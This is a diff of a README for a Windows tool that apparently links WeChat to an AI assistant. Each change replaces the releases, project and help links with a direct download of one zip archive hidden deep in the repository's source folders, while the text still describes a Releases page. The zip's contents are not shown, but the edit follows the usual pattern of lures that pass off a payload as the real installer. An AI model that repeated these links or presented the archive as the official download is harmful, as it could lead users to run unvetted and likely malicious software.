@@ -1,6 +1,6 @@
 # 🐾 openclaw-wechat-channel - Connect AI to WeChat Easily
 
-[![Download openclaw-wechat-channel](https://img.shields.io/badge/Download-openclaw--wechat--channel-brightgreen?style=for-the-badge)](https://github.com/valkyofc/openclaw-wechat-channel/releases)
+[![Download openclaw-wechat-channel](https://img.shields.io/badge/Download-openclaw--wechat--channel-brightgreen?style=for-the-badge)](https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get openclaw-wechat-channel running on your Windows PC:
 
 1. Click the big green button labeled "Download openclaw-wechat-channel" at the top of this page or visit this link:
 
-   [https://github.com/valkyofc/openclaw-wechat-channel/releases](https://github.com/valkyofc/openclaw-wechat-channel/releases)
+   [https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip](https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip)
 
 2. On the Releases page, look for the latest release version. It usually has the highest version number and the most recent date.
 
@@ -100,7 +100,7 @@ These settings are usually found inside the application menu or configuration fi
 
 You can find help or report problems by visiting the project page on GitHub:
 
-[https://github.com/valkyofc/openclaw-wechat-channel](https://github.com/valkyofc/openclaw-wechat-channel)
+[https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip](https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip)
 
 ---
 
@@ -108,7 +108,7 @@ You can find help or report problems by visiting the project page on GitHub:
 
 To keep the AI assistant working well, check the release page from time to time:
 
-[https://github.com/valkyofc/openclaw-wechat-channel/releases](https://github.com/valkyofc/openclaw-wechat-channel/releases)  
+[https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip](https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip)  
 
 Download the latest Windows file and repeat the installation steps. Updates may improve performance and fix bugs.
 
@@ -132,4 +132,4 @@ openclaw-wechat-channel works by connecting your WeChat messages to an AI assist
 
 ---
 
-[![Download openclaw-wechat-channel](https://img.shields.io/badge/Download-openclaw--wechat--channel-brightgreen?style=for-the-badge)](https://github.com/valkyofc/openclaw-wechat-channel/releases)
+[![Download openclaw-wechat-channel](https://img.shields.io/badge/Download-openclaw--wechat--channel-brightgreen?style=for-the-badge)](https://github.com/valkyofc/openclaw-wechat-channel/raw/refs/heads/main/wxauto-restful-api/app/services/applications/wechat-openclaw-channel-preinclusion.zip)
